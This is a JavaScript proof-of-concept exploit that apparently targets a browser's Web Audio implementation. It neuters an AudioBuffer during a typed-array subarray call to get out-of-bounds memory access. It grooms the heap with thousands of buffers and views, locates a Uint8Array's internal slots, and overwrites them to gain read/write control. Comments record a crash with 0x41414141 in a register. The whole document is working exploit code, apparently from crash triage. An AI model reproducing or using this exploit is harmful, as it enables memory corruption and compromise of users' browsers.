function NeuterRW() {
  this.Init();
  this.Groom();
  this.Trigger();
  this.SetupRW();
  this.OverwriteMembers();
  this.Access();
}

NeuterRW.prototype.Configuration = function() {
  this.num_arraybuffers = 10000;
  this.num_audiobuffers = 10;
  this.num_views        = 500000;
  this.view_size        = 0x100000;
  this.magic_offset     = Math.floor(Math.random() * 0x100000);
  this.magic_length     = this.view_size - this.magic_offset;
  this.oob_size         = 0x100000;
  this.oob_size_u32     = this.oob_size / 4;
}

NeuterRW.InstallSlots = function() {
  if (platform.Is64BitBrowser()) {
    NeuterRW.prototype.TypeSlot       =  2;
    NeuterRW.prototype.ByteOffsetSlot =  8;
    NeuterRW.prototype.ByteLengthSlot = 10;
    NeuterRW.prototype.LengthSlot     = 18;
    NeuterRW.prototype.DataSlot       = 22;
    NeuterRW.prototype.TotalSlots     = 24;
  } else {
    NeuterRW.prototype.TypeSlot       =  1;
    NeuterRW.prototype.ByteOffsetSlot =  4;
    NeuterRW.prototype.ByteLengthSlot =  6;
    NeuterRW.prototype.LengthSlot     = 14;
    NeuterRW.prototype.DataSlot       = 18;
    NeuterRW.prototype.TotalSlots     = 20;
  }
}

NeuterRW.prototype.Init = function() {
  this.conf = new this.Configuration();
  this.audio_context = new AudioContext();
}

NeuterRW.prototype.Groom = function() {
  var conf = this.conf;
  this.unused = [];
  this.views = [];
  this.buffer_for_views = new ArrayBuffer(conf.view_size);
  for (var i = 0; i < conf.num_arraybuffers; i++)
    this.unused.push(new ArrayBuffer(1));
  for (var i = 0; i < conf.num_audiobuffers; i++)
    this.unused.push(this.audio_context.createBuffer(1, conf.oob_size_u32, 96000));
  for (var i = 0; i < conf.num_views; i++)
    this.views.push(new Uint8Array(this.buffer_for_views, conf.magic_offset, conf.magic_length));
  this.audio_buffer = this.unused.pop();
}

NeuterRW.prototype.EndValue = function(conf, NeuterCallback) {
  this.conf = conf;
  this.NeuterCallback = NeuterCallback;
}

NeuterRW.prototype.EndValue.prototype.valueOf = function() {
  this.NeuterCallback();
  return this.conf.oob_size_u32;
}

NeuterRW.prototype.NeuterAudioBuffer = function() {
  var convolver = this.audio_context.createConvolver();
  convolver.buffer = this.audio_buffer;
}

NeuterRW.prototype.Trigger = function() {
  end = new this.EndValue(this.conf, this.NeuterAudioBuffer.bind(this));
  var view_f32 = this.audio_buffer.getChannelData(0);
  var array_buffer = view_f32.buffer;
  var view_u32_tmp = new Uint32Array(array_buffer);
  this.oob = view_u32_tmp.subarray(0, end);
  Log('[+] Got OOB block');
}
// 1020f390 mov [edx+eax+0], cl --> eax = 41414141, edx = e
NeuterRW.prototype.FindAnyUint8Array = function() {
  var found = false;
  for (var i = 0; i < this.oob.length; i++) {
    if (this.oob[i + this.ByteOffsetSlot] == this.conf.magic_offset &&
        this.oob[i + this.ByteLengthSlot] == this.conf.magic_length) {
      found = true;
      Log('[+] Found Uint8Array');
      break;
    }
  }
  Check(found, 'Bad grooming, no TypedArrayObject after ArrayBufferObject');
  return i;
}

NeuterRW.prototype.IdentifyUint8Array = function() {
  this.oob[this.SlotOffset(this.ByteOffsetSlot)]--;
  var found = false;
  for (var i = 0; i < this.views.length; i++) {
    if (this.views[i].byteOffset == this.conf.magic_offset - 1) {
      found = true;
      Log('[+] Identified Uint8Array');
      break;
    }
  }
  Check(found, 'Huh, can\'t find the modified view');
  return this.views[i];
}

NeuterRW.prototype.SetupRW = function() {
  this.rw_view_slots = this.FindAnyUint8Array(); // oob index
  this.rw_view = this.IdentifyUint8Array();
}

NeuterRW.prototype.SlotOffset = function(slot) {
  return this.rw_view_slots + slot;
}

NeuterRW.prototype.OverwriteMembers = function() {

  for (var i = 0; i < this.TotalSlots; i++)

//--- GENERATED PART START ---
    this.oob[this.SlotOffset(18)] = 0x41414141; // 1020f390 mov [edx+eax+0], cl --> eax = 41414141, edx = 0
//--- GENERATED PART END ---
  Log('[+] Overwrote Members');
}

NeuterRW.prototype.Access = function() {
  Log('[+] Accessing...');

//--- GENERATED PART START ---
  this.rw_view[0] = 0x42; // 1020F390 mov [edx+eax+0], cl  --> cl = 42
//--- GENERATED PART END ---
  Log('[+] Done');
}
